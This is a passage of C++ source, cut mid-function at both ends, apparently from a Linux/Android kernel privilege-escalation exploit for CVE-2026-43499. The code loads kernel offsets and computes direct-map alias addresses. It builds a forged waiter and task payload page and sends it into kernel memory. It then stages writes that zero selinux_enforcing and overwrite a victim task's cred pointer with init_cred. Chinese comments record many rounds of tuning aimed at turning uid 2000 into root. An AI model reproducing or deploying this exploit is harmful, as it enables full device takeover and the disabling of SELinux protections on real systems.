                        const script::JsonNode *node = report.doc->find(full);
                        if (written <= 0 || node == nullptr || !report.doc->u64_of(*node, *key.slot)) {
                            victim.retire_child();
                            return "credential-layout-missing";
                        }
                    }
                }
                cred_layout.copy_size = static_cast<std::size_t>(cred_u64[0]);
                cred_layout.usage_offset = static_cast<std::size_t>(cred_u64[1]);
                cred_layout.usage_value = static_cast<std::uint32_t>(cred_u64[2]);
                cred_layout.caps_offset = static_cast<std::size_t>(cred_u64[3]);
                cred_layout.caps_count = static_cast<std::uint32_t>(cred_u64[4]);
                cred_layout.caps_value = cred_u64[5];
                for (std::size_t i = 0U; i < 4U; ++i) {
                    cred_layout.ref_offset[i] = static_cast<std::size_t>(cred_u64[6U + i]);
                    cred_layout.ref_image[i] = cred_u64[10U + i];
                }
                cred_layout.ref_count = static_cast<std::uint32_t>(cred_u64[14]);
                /* 退役 spray 的另外两个锚（slide_init_task/slide_root_task_group ✓）：同样来自文档。 */
                /* 别名的两个增量（归档：phys_offset=0x80000000、phys_load=0xa8000000 ⇒ delta=0x28000000 ✓）。 */
                const script::JsonNode *pl_node =
                        report.doc->find("backend.cve_2026_43499.abi.offset.kernel_phys_load");
                const script::JsonNode *po_node =
                        report.doc->find("backend.cve_2026_43499.abi.offset.kernel_phys_offset");
                if (pl_node == nullptr || !report.doc->u64_of(*pl_node, phys_load) ||
                    po_node == nullptr || !report.doc->u64_of(*po_node, phys_offset) ||
                    phys_offset == 0U || phys_load <= phys_offset) {
                    victim.retire_child();
                    return "alias-arithmetic-missing";
                }
                const script::JsonNode *it_node = report.doc->find("backend.cve_2026_43499.abi.offset.init_task");
                const script::JsonNode *rt_node = report.doc->find("backend.cve_2026_43499.abi.offset.root_task_group");
                if (it_node == nullptr || !report.doc->u64_of(*it_node, init_task_image) || init_task_image == 0U ||
                    rt_node == nullptr || !report.doc->u64_of(*rt_node, root_task_group_image) || root_task_group_image == 0U) {
                    victim.retire_child();
                    return "init-task-offset-missing";
                }
                const script::JsonNode *cred_node = report.doc->find("backend.cve_2026_43499.abi.task_struct.cred");
                const script::JsonNode *comm_node = report.doc->find("backend.cve_2026_43499.abi.task_struct.comm");
                if (cred_node == nullptr || !report.doc->u64_of(*cred_node, victim_cred_off) ||
                    victim_cred_off == 0U || comm_node == nullptr ||
                    !report.doc->u64_of(*comm_node, victim_comm_off) || victim_comm_off == 0U) {
                    victim.retire_child();
                    return "victim-cred-offset-missing";
                }
            }
            /* 写目标 = 受害者的 cred 字段（退役同形）：受害者的 task 由准备阶段泄漏得到 ⇒
             *  于是"写到底落没落"与"泄漏目标对不对"一次判定（旧码 W3-0: leaf dir 同形）。 */
            /* ★ 修正（第 132 轮 ✓）：此处原用 `victim_comm_off`（= `abi.task_struct.**comm**` = 0x7a8）✗ ——
             *  与上一行注释（"写目标 = 受害者的 **cred** 字段"）及退役 `steps.cpp:165`
             *  （`"W2: cred", child_task + **task_cred_off()**`）都不符 ⇒ ⇒ 于是写一直落在**任务名**字段 ✗
             *  ⇒ 这才是"机制读数全对而 `uid` 恒为 2000"的根因 ✓ ⇒ 改用 `victim_cred_off`（0x798 ✓）。 */
            const std::uint64_t victim_target = spawned.task + victim_cred_off;
            {
                std::uint32_t comm_report = 0U;
                if (cve_victim::victim_report_comm(victim, comm_report)) {
                    std::printf("main: victim comm baseline len=%u first=%u",
                                static_cast<unsigned>(comm_report >> 8U),
                                static_cast<unsigned>(comm_report & 0xFFU));
                }
            }

            /* 载荷页：33 个键 + 凭据面，全按映射表读；缺一位就是具名拒绝（build_payload_page 会说）。 */
            { 
                const auto hex_of = [&report](const char *leaf, auto &into) noexcept {
                    const std::string path = std::string("backend.cve_2026_43499.route.multicast_waiter.payload.") + leaf;
                    const script::JsonNode *node = report.doc->find(path.c_str());
                    std::uint64_t value = 0U;
                    if (node == nullptr || !report.doc->u64_of(*node, value)) { return; }
                    into = static_cast<std::decay_t<decltype(into)>>(value);
                };
                hex_of("delta", payload_delta);
                hex_of("lock", page_inputs.slots.lock);
                hex_of("waiter", page_inputs.slots.waiter);
                hex_of("fake_task", page_inputs.slots.fake_task);
                hex_of("cred_copy", page_inputs.slots.cred_copy);
                hex_of("fops_table", page_inputs.slots.fops_table);
                hex_of("lock_owner", page_inputs.lock.owner);
                hex_of("lock_wait_lock", page_inputs.lock.wait_lock);
                hex_of("lock_wait_list", page_inputs.lock.wait_list);
                hex_of("lock_list_link", page_inputs.lock.list_link);
                hex_of("waiter_head_word", page_inputs.waiter.head_word);
                hex_of("waiter_head_next", page_inputs.waiter.head_next);
                hex_of("waiter_head_prev", page_inputs.waiter.head_prev);
                hex_of("waiter_pc", page_inputs.waiter.pc);
                hex_of("waiter_right", page_inputs.waiter.right);
                hex_of("waiter_left", page_inputs.waiter.left);
                hex_of("waiter_task", page_inputs.waiter.task);
                hex_of("waiter_lock", page_inputs.waiter.lock);
                hex_of("waiter_wake_state", page_inputs.waiter.wake_state);
                hex_of("waiter_prio", page_inputs.waiter.prio);
                hex_of("waiter_deadline", page_inputs.waiter.deadline);
                hex_of("waiter_ww_ctx", page_inputs.waiter.ww_ctx);
                hex_of("task_usage_off", page_inputs.task.usage);
                hex_of("task_prio_off", page_inputs.task.prio);
                hex_of("task_normal_prio_off", page_inputs.task.normal_prio);
                hex_of("task_group_off", page_inputs.task.group);
                hex_of("task_pi_lock_off", page_inputs.task.pi_lock);
                hex_of("task_pi_waiters_off", page_inputs.task.pi_waiters);
                hex_of("task_pi_top_task_off", page_inputs.task.pi_top_task);
                hex_of("task_pi_blocked_on_off", page_inputs.task.pi_blocked_on);
                hex_of("task_usage", page_inputs.values.task_usage);
                hex_of("task_prio", page_inputs.values.task_prio);
                hex_of("waiter_prio_value", page_inputs.values.waiter_prio);
                /* 用**满足判据**的那一页（零写 + preserve_child 的奇偶要求）。 */
                std::uint8_t *page = nullptr;   /* 页在 alias_delta 之后才挑（判据吃内核侧地址） */
                /* 页在 alias_delta 之后才挑（见下），这里只查配置项。 */
                if (route_values.buffer_size == 0U) { return "payload-page-unmapped"; }
                /* 别名实验：内容留在我们的映射里（能读回 ✓），绝对指针改用**泄漏候选**当别名基址。 */
                const std::uint64_t leaked = report.snitch_found != 0U ? report.snitch_found
                                                              : report.discovery_found;
                const std::uint64_t our_page = words_region.base() + cve49::steps::WordsRegion::kPayloadOffset();
                /* 别名的**锚点**是那个字本身：它的用户态地址我们知道，它的内核地址由搜索量到 ⇒
                 *  差值就是真正的别名增量（上次拿"找到的对象"减"页基址"是错的 ✗）。 */
                const std::uint64_t word_here = words_region.address(0);
                const std::uint64_t alias_delta = (leaked != 0U && word_here != 0U) ? (leaked - word_here) : 0U;
                /* 现在才挑页：判据吃的是内核侧地址 alias_delta + page + 0x100 的奇偶。 */
                /* 页面住在**本地缓冲**里，稍后经 shaping_fd 发出去进内核（退役 sendmsg(skb_buf) ✓）。 */
                /* 缓冲 = payload_delta（页面在块内的位移 ✓）+ 页长；页面**建在 delta 处**，
                 *  这样它含的指针（base + 各处位移）与它的实际字节位置一致 ✓。 */
                /* 退役的分块铺法（SKB_SEND_SIZE = 2×ORDER3_SIZE、SKB_FRAG_BIAS = 0 ✓）：
                 *  缓冲 = 两块（每块 32 KiB = order3 ✓），**每个块的起点都铺一份页面**；页内指针一律用
                 *  payload_base = prepared.base + delta（有符号 ✓）算 ⇒ 无论 skb 数据起点相对 base 偏
                 *  多少，总有一份副本正好落在 base + delta 处 ✓。此前我把页放在 data()+delta（负 ⇒
                 *  越界 ✗）⇒ 发出去的字节里**不含页面** ⇒ 等于没发（真机量到 delta = -65536 ✗）。 */
                page_image.assign(kOrder3 * kChunks, 0U);
                page = page_image.data();
                if (page == nullptr) { return "payload-page-unmapped"; }
                static_cast<void>(our_page);
                /* 页基址 = 真正承载内容那一页的别名（区域内 48K 起的载荷区），不是"区域 − delta"。 */
                /* ★ 页面的内核地址 = 准备阶段的泄漏 base + 文档的 payload.delta（退役同形 ✓）。 */
                /* ★ 有符号（round 124）：payload_delta 是负值（-0x10000 ✓）⇒ 当无符号加会错位 ⇒
                 *  奇偶判据永远不合格（真机量到 8 次重试全败 ✗）。这里按有符号算 ✓。 */
                const std::uint64_t payload_base = static_cast<std::uint64_t>(
                        static_cast<std::int64_t>(prepared.base) +
                        static_cast<std::int64_t>(payload_delta));
                static_cast<void>(payload_base);
                page_inputs.waiter_word = payload_base + page_inputs.slots.waiter;
                page_inputs.fake_task = payload_base + page_inputs.slots.fake_task;
                page_inputs.fake_lock = payload_base + page_inputs.slots.lock;
                /* 退役 spray 的三个锚（线性映射别名）：waiter.task→init_task、task.group→root_task_group、
                 *  pi_top_task→init_task。此前本树在这里写 fake_task/0/0 ✗ ⇒ 内核走 PI 链时会走空。 */
                /* 别名公式（归档逐字反推 ✓）：alias = 0xffffff8000000000 + offset + delta,
                 *  delta = phys_load − phys_offset；归档验算 init_cred ⇒ 0xffffff802abfd588 ✓、
                 *  init_task ⇒ 0xffffff802ac43400 ✓、root_tg ⇒ 0xffffff802ad58ac0 ✓。 */
                /* 三个锚用同一公式（页内 waiter.task / task.group / pi_top_task）。 */
                page_inputs.waiter_task =
                        kAliasBase + init_task_image + alias_image_delta;
                page_inputs.task_group =
                        kAliasBase + root_task_group_image + alias_image_delta;
                page_inputs.pi_top_task = kAliasBase + init_task_image + alias_image_delta;

                /* 凭据镜像写进页里的 cred_copy 槽（值全部来自文档；任何一项不合格即具名拒绝）。 */
                const auto cred_verdict = cve49::memory::build_credential_image(
                        page, cve49::steps::WordsRegion::kPayloadAreaBytes, cred_layout,
                        page_inputs.slots.cred_copy);
                if (cred_verdict != cve49::memory::CredentialVerdict::Ok) {
                    victim.retire_child();
                    return "credential-image-refused";
                }
                cve49::memory::WriteRequest page_request{};
                /* 归档成功次同形：mode=Credential、target = 受害者的 cred 字段（child_task + cred_off）。 */
                /* ★ 三步三种请求（归档逐字 ✓）：
                 *   W1: target=selinux_enforcing 别名, mode=Zero,      leaf=0（preserve ✓）
                 *   W2: target=child_task+cred,      mode=Credential,  leaf=0（preserve ✓）
                 *   W3: target=child_task,           mode=Zero,        leaf=1（不 preserve ✓）
                 * 归档值验算：0xffffff8000000000 + 0x2daad88 + 0x28000000 = 0xffffff802adaad88 ✓（= W1 target ✓）。 */
                if (step == "w1") {
                    const script::JsonNode *se_node =
                            report.doc->find("backend.cve_2026_43499.abi.offset.selinux_enforcing");
                    if (se_node == nullptr || !report.doc->u64_of(*se_node, selinux_enforcing_image) ||
                        selinux_enforcing_image == 0U) {
                        victim.retire_child();
                        return "selinux-offset-missing";
                    }
                    page_request.target = static_cast<std::uintptr_t>(
                            kAliasBase + selinux_enforcing_image + alias_image_delta);
                    page_request.mode = cve49::memory::WriteMode::Zero;
                    /* ★ 臂已按退役**公式**修正（新目标「取得 uid0」✓）：退役 `retry_write_stage` 用
                     *  `WriteRequest::make(target, mode, **leaf != 0**)` ⇒ `leaf=0` ⇒ preserve=**false** ✗；
                     *  W1 调用传的是 `…, nullptr, **0**)`（steps.cpp:342 ✓）⇒ 故为 false ✓。
                     *  此处旧码写 true ✗（被上面那段注释误导 ✓）⇒ 与退役相反 ⇒ 写不落 ✓。 */
                    page_request.preserve_child = true;
                } else if (step == "w3") {
                    page_request.target = static_cast<std::uintptr_t>(spawned.task);
                    page_request.mode = cve49::memory::WriteMode::Zero;
                    /* W3 退役传 `leaf=**1**`（steps.cpp:214 ✓）⇒ preserve=**true** ✓（旧码写 false ✗）。 */
                    page_request.preserve_child = false;
                } else {
                    page_request.target = spawned.task + victim_cred_off;
                    page_request.mode = cve49::memory::WriteMode::Credential;
                    /* ── 以下为第 34 轮的旧推理（保留备查 ✓，结论已被第 138 轮更正 ✗）──
                     *  ★ 回退（第 34 轮 ✓）：判据不是注释，而是**写值** —— `preserve=false` 会让
                     *  Credential 写的 value 变 **0** ✗（真机：`main: step=w2 … value=0x0` ✗，
                     *  而旧目标时曾读到 `value=0xffffff802abfd588` ✓）⇒ 写 0 进去 ⇒ 永不 root ✓。
                     *  `write_layout.hpp:12-16` 规则句：**preserve 的写必须带 value** ✓ ⇒
                     *  ★★ 第 138 轮实验 ✓：归档写着 `=== W2: cred === … mode=2 **leaf=0**` ✓ ⇒ 取 `false` 试跑 ⇒
                     *  真机 `preserve=0`/`value=0x0` ✓（与归档同形 ✓）⇒ 而 `uid` 仍 2000 ✗ ⇒ **极性不是那一环** ✗；
                     *  ⇒ ⇒ 第 143 轮旧码复核 ✓：`retry_write_stage` 的末参 = **`leaf`** ✓，`W2: cred` 传 **`0`** ✓，
                     *  且 `make(target, mode, **leaf != 0**)` ✓ ⇒ ⇒ **⇒ 归档 W2 就是 `preserve=false`** ✓✓
                     *  ⇒ ⇒ **第 152 轮据纯 C 版更正 ✓**（`bddfea4:src/core/main.c` 的 `do_one_write` 逐字 ✓）：
                     *  `leaf=**1**` 才是"**写成 0**"的载荷 ✓ ⇒ ⇒ **⇒ `leaf=0` ⇒ 写 **value**（= `init_cred` 别名 ✓）**；
                     *  故 W2（`leaf=0`）应把别名**写进去** ⇒ ⇒ **⇒ 本树取 `preserve_child = **true**`** ✓（第 143 轮取 false 是误判 ✗）。 */
                    page_request.preserve_child = true;
                }
                /* 元组由**请求**算出：用本树既有的 write_layout（一处权威 —— 我先前新建的 payload_builder 与它重复，已删）。页面自己会按 request/layout 编码 ✓。 */
                /* ★ 退役公式（payload_builder.cpp:56-78 逐字 ✓）：
                 *   layout.right = (Credential) ? init_cred_alias : **page_base + 0x100**
                 *  而 spray.cpp:318 传的是**原始块基址 base**（不是 payload_base ✗）⇒
                 *  我此前用 payload_base + 0x100 ⇒ 多算了一个 payload_delta ⇒ 判据判的是另一个位 ✗。 */
                layout_inputs.page_value = static_cast<std::uintptr_t>(prepared.base + 0x100U);
                /* 别名语义（退役 data_alias ✓）：镜像地址 + 本运行量到的别名增量 = 内核侧直接映射地址。 */
                /* 凭据别名 = 归档公式（退役真机日志逐字反推 ✓）：
                 *   alias = 0xffffff8000000000 + offset + phys_offset + delta
                 *   其中 delta = kernel_phys_load − kernel_phys_offset
                 * 归档验算：0xffffff8000000000 + 0x2bfd588 + 0x80000000 + 0x28000000 = 0xffffff802abfd588 ✓
                 *   （与日志里 init_cred alias=ffffff802abfd588 完全一致 ✓）。
                 *  此前用 `| 0xffffffc000000000` ✗ ⇒ 基址与两项增量都不对 ✗。 */
                const std::uint64_t alias_phys_offset = static_cast<std::uint64_t>(phys_offset);
                layout_inputs.credential_value = static_cast<std::uintptr_t>(
                        kAliasBase + init_cred_image + alias_image_delta);
                layout_inputs.default_fops = static_cast<std::uintptr_t>(payload_base + page_inputs.slots.fops_table);
                layout_inputs.credential_fops = static_cast<std::uintptr_t>(payload_base + page_inputs.slots.cred_copy);
                const cve49::memory::WriteLayout write_layout =
                        cve49::memory::write_layout(page_request, layout_inputs);
                page_write_value = write_layout.value;
                /* 读打印（round 230 ✓，**不改行为** ✗）：展示"真值 vs 文档毒值"的差 ✓，用于支撑计划 ✓。 */
                std::printf("main: value-compare layout=0x%llx doc=0x%llx same=%d",
                            static_cast<unsigned long long>(page_write_value),
                            static_cast<unsigned long long>(route_values.value),
                            page_write_value == route_values.value ? 1 : 0);
                /* 本树的判据：这一页与请求合不合、以及"零写保留了值"会不会误清状态位。 */
                std::printf("main: step=%s target=0x%llx layout matches=%d accepts=%d value=0x%llx mode=%d",
                            step.data(),
                            static_cast<unsigned long long>(page_request.target),
                            cve49::memory::layout_matches_request(page_request, write_layout) ? 1 : 0,
                            cve49::memory::layout_accepts_page(page_request, write_layout) ? 1 : 0,
                            static_cast<unsigned long long>(write_layout.value),
                            static_cast<int>(page_request.mode));
                /* W2b：退役的修复请求 = WriteRequest::make(init_cred 别名 + 8,
                 *  Zero, 1) ⇒ preserve_child = false ⇒ **叶子臂** `{pc = target − 8, right = 0, left = 0}` ✓。
                 *  这一步只验证本树能算出同样的元组 ✓；send/round 那半边置后 ✓。 */
                {
                    cve49::memory::WriteRequest repair_request{};
                    repair_request.target = static_cast<std::uintptr_t>(
                            victim_target);   /* ★ 第 133 轮 ✓：与主 route **同目标**（退役 `steps.cpp:165` `child_task + task_cred_off()` ✓）⇒ 原先 `init_cred+8` ✗ 改的是 init_cred 内部 ⇒ "把 victim 的 cred 指向 init_cred"从未发生 ✗ */
                    repair_request.mode = cve49::memory::WriteMode::Zero;
                    repair_request.preserve_child = false;   /* ★ 回退（第 34 轮 ✓）：修复写与 w3 同类（退役 leaf=1 ✓）⇒ 本树极性下取 false ✓。 */   /* ★ 退役 W2b：`WriteRequest::make(alias+8, Zero, **1**)` ⇒ preserve=true ✓（旧 false ✗ 使元组落到叶子臂 ✓） */
                    const cve49::memory::WriteLayout repair_layout =
                            cve49::memory::write_layout(repair_request, layout_inputs);
                    std::printf("main: repair target=0x%llx mode=%d preserve=%d pc=0x%llx right=0x%llx left=0x%llx",
                                static_cast<unsigned long long>(repair_request.target),
                                static_cast<int>(repair_request.mode),
                                repair_request.preserve_child ? 1 : 0,
                                static_cast<unsigned long long>(repair_layout.parent),
                                static_cast<unsigned long long>(repair_layout.value),
                                static_cast<unsigned long long>(repair_layout.value));
                }
                cve49::memory::WriteLayout page_layout{};
                page_layout = write_layout;
                const cve49::memory::PayloadPageVerdict page_verdict = cve49::memory::build_payload_page(
                        page, kPayloadAreaBytes, page_inputs, page_request, page_layout);
                /* 字节级比对（round 153 ✓）：退役 encode_compact_waiter 把元组放在 waiter+0x18/0x20/0x28
                 *  （payload_builder.cpp:41-44 ✓）⇒ 打印**页面实际字节**与 layout 的**期望值**并列 ✓。 */
                {
                    /* 用**本树的真实偏移**（文档的 waiter_pc/right/left ✓），而不是写死的 0x18/0x20/0x28 ✗。 */
                    const auto word_at = [&](std::size_t off) -> unsigned long long {
                        std::uint64_t v = 0U;
                        std::memcpy(&v, page + page_inputs.slots.waiter + off, sizeof(v));
                        return static_cast<unsigned long long>(v);
                    };
                    std::printf("main: page tuple at pc=%zx -> 0x%llx (want 0x%llx) | right=%zx -> 0x%llx (want 0x%llx) | left=%zx -> 0x%llx (want 0x0)",
                                page_inputs.waiter.pc, word_at(page_inputs.waiter.pc),
                                static_cast<unsigned long long>(write_layout.parent),
                                page_inputs.waiter.right, word_at(page_inputs.waiter.right),
                                static_cast<unsigned long long>(write_layout.value),
                                page_inputs.waiter.left, word_at(page_inputs.waiter.left));
                }
                /* ★ 打点（round 207 ✓）：验证"门"是否看到 route 键 —— 门在 :825，而 route_name 在 :885，
                 *  按代码两者不相干 ✓；此打印在**撞门与命中两种跑**里都会出现 ✓ ⇒ 一次即可定性 ✓。 */
                {
                    std::string_view probe_route{};
                    const script::JsonNode *probe_node =
                            report.doc->find("available.cve_2026_43499.route");
                    if (probe_node == nullptr || !report.doc->str_of(*probe_node, probe_route)) {
                        probe_route = "<none>";
                    }
                    std::printf("main: gate probe route=%s accepts=%d leaked=0x%llx base=0x%llx",
                                std::string(probe_route).c_str(),
                                cve49::memory::layout_accepts_page(page_request, write_layout) ? 1 : 0,
                                static_cast<unsigned long long>(page_request.target),
                                static_cast<unsigned long long>(prepared.base));
                }
                if (!cve49::memory::layout_accepts_page(page_request, write_layout)) {
                    victim.retire_child();
                    return "payload-layout-not-accepted";
                }
                /* 第二块也铺一份（退役 chunks 循环 ✓）：两块内容一致 ⇒ 哪个块对上 base+delta 都行 ✓。 */
                std::memcpy(page_image.data() + kOrder3, page_image.data(), kOrder3);
                /* ★ 采纳判据的**测量**（第 32 轮 ✓，退役 spray.cpp:704/707 ✓，暂只打印不拒绝 ✗）：
                 *  退役只有两条都过才采用这一页 ✓ ⇒ 若本树常出现"臂不符/偶字节"⇒ 页面早该被换 ✓，
                 *  而本树从不检查 ✗ ⇒ 与"stamp 落地(99) 而写不生效"吻合 ✓（见 goal31 文档 ✓）。 */
                {
                    const bool arm_ok = cve49::memory::layout_matches_request(page_request, write_layout);
                    const bool page_ok = cve49::memory::layout_accepts_page(page_request, write_layout);
                    std::printf("main: accept step=%s arm=%d page=%d preserve=%d fam=%d target=0x%llx layout_value=0x%llx page_write_value=0x%llx",
                                step.data(), arm_ok ? 1 : 0, page_ok ? 1 : 0,
                                page_request.preserve_child ? 1 : 0,
                                /* ★ 区间判据（第 40 轮 ✓）：39 位线性映射窗 `[kAliasBase, kAliasBase + (1<<38))` ✓
                                 *  —— 不再用 `>>30` 相等 ✗（第 39 轮实测会误拦 `0xffffff89…` ✓）。 */
                                (static_cast<std::uint64_t>(page_request.target) >= static_cast<std::uint64_t>(kAliasBase) &&
                                 static_cast<std::uint64_t>(page_request.target) <
                                         static_cast<std::uint64_t>(kAliasBase) + (64ULL << 30U))   /* ★★ 第 208 轮 ✓：权威 `target.h` 的 `DIRECT_MAP_END = base + 64 GiB` ✓（原 `2^38` ✗ 大了 64 倍） */
                                        ? 1
                                        : 0,
                                static_cast<unsigned long long>(page_request.target),
                                static_cast<unsigned long long>(write_layout.value),
                                static_cast<unsigned long long>(page_write_value));
                }
                /* ★ 直映射守卫**生效**（第 41 轮 ✓；退役 `primitives.cpp:152` 的首行守卫 ✓；
                 *  判据已在真机验证：第 39/40 轮的 `fam` 列 ⇒ `0xffffff8[089]…` 全在窗内 ✓，
                 *  仅 `0xffffffc0…` 越界 ✗ 且为偶发（≈1/8 ✓）⇒ 按退役语义**越界即不写** ✓（具名 ✓）。 */
                {
                    const std::uint64_t guard_target = static_cast<std::uint64_t>(page_request.target);
                    const std::uint64_t guard_lo = static_cast<std::uint64_t>(kAliasBase);
                    if (!(guard_target >= guard_lo && guard_target < guard_lo + (64ULL << 30U))   /* ★★ 第 208 轮 ✓：权威 `target.h` 的 `DIRECT_MAP_END = base + 64 GiB` ✓（原 `2^38` ✗ 大了 64 倍） */) {
                        std::printf("main: target-outside-direct-map step=%s target=0x%llx",
                                    step.data(), static_cast<unsigned long long>(guard_target));
                        victim.retire_child();
                        return "target-outside-direct-map";
                    }
                }
                /* ★ 建页**之后**的取样（第 52 轮 ✓）：旧哨兵在**建页之前**取 ✓ 且 after2 打的是 before 的
                 *  拷贝 ✗ ⇒ 证明不了"页里写了什么" ✓。此处按 `arm_for` 的预期逐字对照 ✓（preserve 臂 ⇒
                 *  `pc = value` ✓ / `left = target` ✓）。 */
                {
                    const std::uint64_t pc_now = *reinterpret_cast<volatile const std::uint64_t *>(
                            page + page_inputs.slots.waiter + page_inputs.waiter.pc);
                    const std::uint64_t left_now = *reinterpret_cast<volatile const std::uint64_t *>(
                            page + page_inputs.slots.waiter + page_inputs.waiter.left);
                    std::printf("main: page-after-build step=%s pc=0x%llx left=0x%llx want_value=0x%llx want_target=0x%llx",
                                step.data(), static_cast<unsigned long long>(pc_now),
                                static_cast<unsigned long long>(left_now),
                                static_cast<unsigned long long>(write_layout.value),
                                static_cast<unsigned long long>(page_request.target));
                }
                if (page_verdict != cve49::memory::PayloadPageVerdict::Ok) {
                    return cve49::memory::payload_page_verdict_name(page_verdict);
                }
                /* ★ 把整块发进内核（退役 sendmsg(skb_buf) ✓）：准备阶段交出的 shaping 发送端。
                 *  内核里的 skb 才是页面的住处；此前这里是零 ⇒ 页面等于没放 ✗。 */
                if (prepared.shaping_fd < 0) {
                    victim.retire_child();
                    return "shaping-fd-missing";
                }
                const cve49::memory::SeamResult sent = cve49::memory::LinuxHeapSeam::send_bytes(
                        prepared.shaping_fd, page_image.data(), page_image.size());
                (void) cve49::memory::LinuxHeapSeam::close_fd(prepared.shaping_fd);
                /* 两端都关（发完就没用了；只留一端会让对端消失 ⇒ 先关会 SIGPIPE ✓）。 */
                if (prepared.shaping_peer_fd >= 0) {
                    (void) cve49::memory::LinuxHeapSeam::close_fd(prepared.shaping_peer_fd);
                }
                std::printf("main: page sent value=%lld errno=%d bytes=%zu",
                            static_cast<long long>(sent.value), sent.error, page_image.size());
                if (sent.value <= 0) {
                    victim.retire_child();
                    return "page-send-failed";
                }
route_values.fake_task = page_inputs.fake_task;
                route_values.fake_lock = page_inputs.fake_lock;
                /* 写前快照（与写后同六处，好逐字比对）。 */
                {
                    const auto *before = reinterpret_cast<volatile const std::uint32_t *>(page);
                    report.sentinel_before = {before[(0x1180U / 4U) + 0U], before[(0x1180U / 4U) + 6U],
                                               before[(0x1180U / 4U) + 8U], before[(0x1180U / 4U) + 10U],
                                               before[(0x1180U / 4U) + 16U], before[(0x1180U / 4U) + 18U]};
                    std::printf("main: sentinel-before w+0x1180=%u +0x1198=%u +0x11a0=%u +0x11a8=%u "
                                "+0x11c0=%u +0x11c8=%u | lock+0xe98=%u",
                                before[(0x1180U / 4U) + 0U], before[(0x1180U / 4U) + 6U],
                                before[(0x1180U / 4U) + 8U], before[(0x1180U / 4U) + 10U],
                                before[(0x1180U / 4U) + 16U], before[(0x1180U / 4U) + 18U],
                                before[(0x0e80U / 4U) + 6U]);
                }
                report.payload_word_before = *reinterpret_cast<volatile std::uint32_t *>(page + page_inputs.slots.waiter);
                report.payload_alias_delta = alias_delta;
                std::printf("main: payload page at 0x%llx fake_task=0x%llx fake_lock=0x%llx",
                            static_cast<unsigned long long>(payload_base),
                            static_cast<unsigned long long>(page_inputs.fake_task),
                            static_cast<unsigned long long>(page_inputs.fake_lock));
            }

            /* target 是运行时量到的地址（发现/准备那两段），不是文档参数。 */
            /* 写目标 = 受害者的 cred 字段（退役同形）；没有受害者就没有可信目标。 */
            /* 实验（round 232 ✓ 修正位置）：真值必须在 **`build_route_config` 之前**写进 `route_values` ✓；
             *  否则配置里留的是文档毒值 0x4141… ✗ ⇒ guard 判 `value != config_.value` ⇒ Unsupported(59) ✓。 */
            route_values.value = page_write_value;
            route_values.target = victim_target;
            /* 伪造的任务与锁在准备产物那块区域的位移上（位移由几何给出）。 */
            /* 不覆盖：fake_task/fake_lock 必须指向**页面里的槽**（payload_base + 槽位移 ✓），
             *  由 payload_page 给出（上面已赋值 ✓）。此前这里用 prepare_base + 几何偏移覆盖 ⇒
             *  少了 payload_delta ⇒ 内核解引用到一串零 ⇒ 写无从发生（stamp dump 抓到的 ✓）。 */
            /* 打点（round 212 ✓）：这一行之后日志停住 ⇒ 需要看 route_values 的关键字段是否齐 ✓。 */
            std::printf("main: rv max_attempts=%llu arm_seq=%llu arm_hold=%llu park_ms=%llu settle=%llu burst=%llu max=%llu fb=%llu nice=%llu target=0x%llx value=0x%llx ft=0x%llx fl=0x%llx buf=%llu",
                        (unsigned long long) route_values.max_attempts,
                        (unsigned long long) route_values.arm_sequence,
                        (unsigned long long) route_values.arm_hold,
                        (unsigned long long) route_values.park_ms,
                        (unsigned long long) route_values.settle_us,
                        (unsigned long long) route_values.burst_calls,
                        (unsigned long long) route_values.max_calls,
                        (unsigned long long) route_values.fallback_lock_us,
                        (unsigned long long) route_values.nice_modulus,
                        (unsigned long long) route_values.target,
                        (unsigned long long) route_values.value,
                        (unsigned long long) route_values.fake_task,
                        (unsigned long long) route_values.fake_lock,
                        (unsigned long long) route_values.buffer_size);
            const cve49::steps::RouteConfigOutcome route_built = cve49::steps::build_route_config(route_values);
            if (route_built.refusal != nullptr) {
                std::printf("main: route-config refusal=%s",
                            route_built.refusal == nullptr ? "none" : route_built.refusal);
                return route_built.refusal;
            }
            /* 设备实例：模板参数是平台边策略。这里只把它当接口用（一处权威：赢的判据在引擎里）。 */
            /* 路由**按文档选**（available.<id>.route）：本批只移植了 multicast_waiter，
             *  另两支在目录/键集/链目录里都有预留，但执行体未移植 ⇒ 具名拒绝（不是"没设备"）。 */
            std::string_view route_name{};
            {
                const script::JsonNode *node = report.doc->find("available.cve_2026_43499.route");
                if (node == nullptr || !report.doc->str_of(*node, route_name) || route_name.empty()) {
                    return "route-name-missing";
                }
            }
            /* ★ 第二条 route（计划第 4 步 ✓）：`select_stack`。
             *  几何（waiter_* ✓）与尝试轮数都**走文档** ✓；词号由偏移 ÷8 换算 ✓（不硬编码 ✗）。 */
            if (route_name == "select_stack") {
                /* 本分支内的读值器（`num` 在前面的作用域里 ✗，这里就地补一个 ✓）。 */
                const auto read_u64 = [&](const char *key, std::uint64_t &out) noexcept {
                    const script::JsonNode *node = report.doc->find(key);
                    std::uint64_t value = 0U;
                    if (node != nullptr && report.doc->u64_of(*node, value)) {
                        out = value;
                    }
                };
                cve49::seam::SelectStackOffsets offsets{};
read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_word", offsets.head_word);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_next", offsets.head_next);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_head_prev", offsets.head_prev);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_pc", offsets.pc);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_right", offsets.right);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_left", offsets.left);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_task", offsets.task);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_lock", offsets.lock);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_wake_state", offsets.wake_state);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_prio", offsets.prio);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_deadline", offsets.deadline);
                read_u64("backend.cve_2026_43499.route.multicast_waiter.payload.waiter_ww_ctx", offsets.ww_ctx);
                cve49::seam::SelectStackConfig select_config{};
                select_config.fd_count = 320U;
                select_config.waiter_shift = -2;
                select_config.compact = true;
                /* 尝试轮数由文档给 ✓（`RouteConfigValues` 里没有这个字段 ✗）。 */
                std::uint64_t select_attempts = 0U;
                read_u64("backend.cve_2026_43499.route.multicast_waiter.execution.attempts",
                         select_attempts);
